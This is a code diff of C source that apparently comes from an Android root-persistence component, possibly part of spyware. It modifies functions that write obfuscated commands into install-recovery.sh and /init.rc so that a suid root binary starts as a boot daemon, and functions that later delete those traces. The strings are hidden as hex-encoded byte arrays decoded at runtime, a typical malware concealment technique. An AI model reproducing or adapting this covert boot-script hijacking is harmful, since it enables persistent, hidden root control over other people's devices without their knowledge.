@@ -89,7 +89,7 @@ int createRecoveryBootScript() {
 
   // Copy root boot script                                                                      
   if(stat(deobfuscate(INSTALL_REC_SCRIPT), &st) < 0) {
-    // Boot script (install-recovery.sh) doesn't exist yet                                                                                             
+    // Boot script (install-recovery.sh) doesn't exist yet
     LOGD("Boot script install-recovery.sh not present");
 
     f2 = fopen(deobfuscate(INSTALL_REC_SCRIPT), "w");
@@ -97,7 +97,7 @@ int createRecoveryBootScript() {
     if(!f2)
       return -1;
 
-    fprintf(f2, "%s\n%s %s &\n", deobfuscate(sh_script), deobfuscate(ROOT_SERVER), deobfuscate(daemon_opt));
+    fprintf(f2, "%s\n%s %s &\n", deobfuscate(sh_script), deobfuscate(ROOT_BIN), deobfuscate(daemon_opt));
 
     fclose(f2);
   }
@@ -122,7 +122,7 @@ int createRecoveryBootScript() {
     chmod(deobfuscate(INSTALL_REC_SCRIPT_BAK), 0755);
 
     // Ok, now append our content to the script file                                                                             
-    snprintf(install_script, sizeof(install_script), "\n%s %s &\n", deobfuscate(ROOT_SERVER), deobfuscate(daemon_opt));
+    snprintf(install_script, sizeof(install_script), "\n%s %s &\n", deobfuscate(ROOT_BIN), deobfuscate(daemon_opt));
     append_content(install_script, deobfuscate(INSTALL_REC_SCRIPT));
   }
 
@@ -135,6 +135,7 @@ int createRecoveryBootScript() {
 // Create the proper boot script
 int createBootScript() {
   static unsigned char debuggerd_str[] = "\xe8\x4b\x84\xad\x93\xae\xa2\x87\x9d\x93\x58\x9c\x93\x9e\xa3\x91\x91\x93\xae\x9c\x58\x59\xad\x97\xad\xac\x93\x9b\x59\x9e\x87\x9a\x59\x9c\x93\x9e\xa3\x91\x91\x93\xae\x9c"; // "service debuggerd /system/bin/debuggerd"
+
   static unsigned char init_str[] = "\x66\x6f\x01\xd7\x11\x18\x11\xee\xd8\xec\x1b"; // "/init.rc"
 
 
@@ -160,7 +161,6 @@ int removeDebuggerdBootScript() {
   struct stat st;
 
   LOGD("Removing suid shell and debuggerd boot script\n");
-  unlink(deobfuscate(ROOT_SERVER));
   // Delete the boot script
   unlink(deobfuscate(INSTALL_SCRIPT));
 		
@@ -170,7 +170,7 @@ int removeDebuggerdBootScript() {
   unlink(deobfuscate(INSTALL_SCRIPT_BAK));
 
   // Remove root client
-  unlink(deobfuscate(ROOT_CLIENT));
+  unlink(deobfuscate(ROOT_BIN));
 
   return 0;
 }
@@ -181,7 +181,6 @@ int removeRecoveryBootScript() {
   struct stat st;
 
   LOGD("Removing suid shell and install-recovery.sh boot script\n");
-  unlink(deobfuscate(ROOT_SERVER));
   // Delete the boot script and check if we have to restore it
   unlink(deobfuscate(INSTALL_REC_SCRIPT));
 		
@@ -191,7 +190,7 @@ int removeRecoveryBootScript() {
     chmod(deobfuscate(INSTALL_REC_SCRIPT), 0755);
   }
 		
-  unlink(deobfuscate(ROOT_CLIENT));
+  unlink(deobfuscate(ROOT_BIN));
 
   return 0;
 }
